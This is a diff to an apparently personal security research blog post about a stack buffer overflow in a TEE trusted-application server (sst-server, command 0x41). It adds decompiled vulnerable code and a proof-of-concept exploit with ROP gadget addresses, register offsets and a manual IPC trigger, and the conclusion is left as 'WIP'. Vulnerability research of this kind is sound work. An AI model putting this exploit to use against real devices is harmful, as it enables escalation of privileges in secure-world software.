@@ -402,15 +402,80 @@ case 2: {
 
     <h2>Stack Buffer Overflow in sst-server</h2>
 
-    <p>The sst-server is not exactly the best example the reverse engineering process outlined above because there is actually no reference to the "sst_client" string. However there seems to be a default dispatch function and by looking at the client libraries we can correlate the command ids handled in the switch statement to the sst_client capability.
+    <p>The sst-server is not exactly the best example the reverse engineering process outlined above because there is actually no reference to the "sst_client" string. However there seems to be a default dispatch function and by looking at the client libraries we can correlate the command ids handled in the switch statement to the sst_client capability. In command 0x41 the do_vfs_work function is called which copies data to the stack using the length provided in the MR7. The pointer at MR9 (puVar4 + 8) points to the filepath, i.e., user controlled data.
 
+<pre><code class="language-armasm">puVar4 = (undefined4 *)utcb;
+uVar5 = puVar3[2];
+switch(*puVar4) {
+	case 0x41: {
+	/* sst_l2_fopen */
+	memset(acStack_218,0,0x101);
+	memset(auStack_114,0,0x101);
+	/* stack overflow */
+	memcpy(auStack_114,puVar4 + 8,puVar4[6]); //lenght is MR7, data is MR9
+	snprintf(acStack_218,0x101,"/data/vendor/thh/%s/%s",uVar5,auStack_114);
+..</code></pre>
+
+    <p>All this effort to end up with a trivial stack buffer overflow :'D... The client code which calls this function in libuTfs.so also does not check the size of the filepath so the vulnerability can be triggered by simply calling the sst_l2_fopen function in the shared library with a file path of size > 0x101. If we however want to overflow with null bytes we need to make the IPC call ourselves.The following shellcode triggers the stack buffer overflow and calls the log function in the sst-server to pprint the "SST!!!" string to the kernel log. (Of course there are also no stack canaries).
+
+<pre><code class="language-armasm">logprintf1("==== sst-shit ==== \n");
+int ov_size = 0x200;
+char* file_path_ = do_malloc(ov_size);
+unsigned char cycl[] = {
+0x61, 0x61, 0x61, 0x61, 0x62, ... };
+file_path_ = cycl;
+file_path_[ov_size-1] = 0;
+// stack pointer: 0x80007d00
+// sst-server base: 0x8000
+// 0x0000f630 : mov r2, #1 ; blx r6
+// offset of r6 268
+// 0x0000f628 : mov r0, r5 ; mov r1, #0 ; mov r2, #1 ; blx r6
+// offset of r5 264
+// puts: 0x99cc
+unsigned int sst_server_data = 0xf628;
+//int* payload = (int*)*(int*)sst_server_data;
+unsigned int payload = sst_server_data;
+//payload = payload + 0x20;
+logprintf2("payload addr: 0x%x\n", payload);
+unsigned int* pc_wow = (unsigned int*)&file_path_[272];
+pc_wow[0] = payload;
+unsigned int* r6 = (unsigned int*)&file_path_[268];
+r6[0] = 0x99cc;
+unsigned int* r5 = (unsigned int*)&file_path_[264];
+r5[0] = 0x80007b80;
+file_path_[101] = 'S';
+file_path_[102] = 'S';
+file_path_[103] = 'T';
+file_path_[104] = '!';
+file_path_[105] = '!';
+file_path_[106] = '!';
+file_path_[107] = '!';
+file_path_[108] = '!';
+file_path_[109] = '\x00';
+char* mode = "r\x00";
+int lib_tvm_sst_base = 0x297000;
+int log_msg_got = lib_tvm_sst_base + 0x104e8;
+// trigger overflow
+do_fopen_manual(lib_tvm_sst_base, file_path_, 280);</code></pre>
+
+   <p>The do_fopen_manual function actually makes the IPC call to the sst-server, adjusting the size parameter from the strlen value to 280. We leverage the lib_tvm_sst_base library in order to avoid fully building the IPC call (which also involves setting up shared memory between the server), instead using the intermediate functions in this library to setup the shared memory.
+   
+    <h4>Demo</h4>
+
+    <video controls width="640" height="360">
+  <source src="sst_ov.mp4" type="video/mp4">
+</video> 
+
+    <h2>Mapping Arbitrary Physical Memory</h2>
+
+    <p>The sst-server has a number of capabilities our TA does not have, by exploiting this stack overflow we could escalate capabilities. However finalizing the exploit for the TA was already annoying enough I did not feel like exploiting the overflow to achieve shellcode execution in the sst-server. Instead I looked for another vulnerability. 
+
+    
 
     <h2>Conclusion</h2>
-    <blockquote>
-      "When Unicorn says 'unmapped', it means it — even if you *think* you've mapped it."
-    </blockquote>
+	WIP
 
-    <p>See more on <a href="https://www.unicorn-engine.org/">Unicorn's official site</a>.</p>
+
   </div>
 </body>
 </html>
